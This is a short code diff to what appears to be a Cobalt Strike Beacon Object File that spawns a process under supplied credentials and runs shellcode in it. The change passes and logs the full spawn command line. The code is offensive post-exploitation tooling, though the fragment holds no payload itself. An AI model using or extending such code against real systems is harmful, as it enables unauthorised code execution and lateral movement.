@@ -88,6 +88,7 @@ VOID go(
 	DWORD ppid = 0;
 
 	char spawnbin[SPAWNSIZE] = {0};
+	wchar_t fullcmd[SPAWNSIZE] = {0};
 	wchar_t * wspawnbin = NULL; 
 	wchar_t * args = NULL;
 
@@ -107,6 +108,7 @@ VOID go(
 	//get configured spawnto
 	BeaconGetSpawnTo(SPAWNASX86, spawnbin, SPAWNSIZE-1 );
 	wspawnbin = Utf8ToUtf16(spawnbin);
+	MSVCRT$wcscpy(fullcmd, wspawnbin);
 	//Parse if we have arguments as well as our function
 	args = MSVCRT$wcsstr(wspawnbin, L".exe");
 	if(args != NULL) { // found .exe
@@ -121,8 +123,8 @@ VOID go(
 			args = NULL;
 		}
 	}
-	internal_printf("Using spawnas binary of %S with arguments of %S\n", wspawnbin, (args == NULL) ? L"NONE" : args);
-	dwErrorCode = shspawnas( domain, username, password, wspawnbin, args, shellcode, shellcodelen);
+	internal_printf("Using spawnas binary of %S with arguments of %S\n", wspawnbin, (args == NULL) ? L"NONE" : fullcmd);
+	dwErrorCode = shspawnas( domain, username, password, wspawnbin, fullcmd, shellcode, shellcodelen);
 	if(ERROR_SUCCESS != dwErrorCode)
 	{
 		BeaconPrintf(CALLBACK_ERROR, "shspawnas failed: %lu\n", dwErrorCode);
